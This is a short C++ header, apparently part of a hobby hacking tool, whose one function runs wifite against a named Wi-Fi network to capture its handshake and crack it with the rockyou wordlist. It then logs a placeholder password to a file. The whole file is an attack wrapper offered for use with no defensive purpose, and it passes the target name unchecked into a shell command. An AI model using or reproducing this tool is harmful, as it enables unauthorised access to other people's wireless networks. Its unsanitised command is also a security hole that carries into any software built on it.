#ifndef CRACKER_H
#define CRACKER_H

#include <iostream>
#include <string>
#include <cstdlib>
#include <fstream>

void crackNetwork(const std::string& target) {
    std::cout << "\n[+] Attempting to capture handshake for: " << target << std::endl;
    
    // Using wifite to capture handshake and crack
    std::string command = "wifite --no-pmkid --no-wps --dict /usr/share/wordlists/rockyou.txt --target " + target;
    system(command.c_str());
    
    // Store cracked password (simplified)
    std::ofstream outfile("cracked_passwords.txt", std::ios_base::app);
    if (outfile.is_open()) {
        outfile << "Network: " << target << " | Password: [captured_password]\n";
        outfile.close();
    }
}

#endif
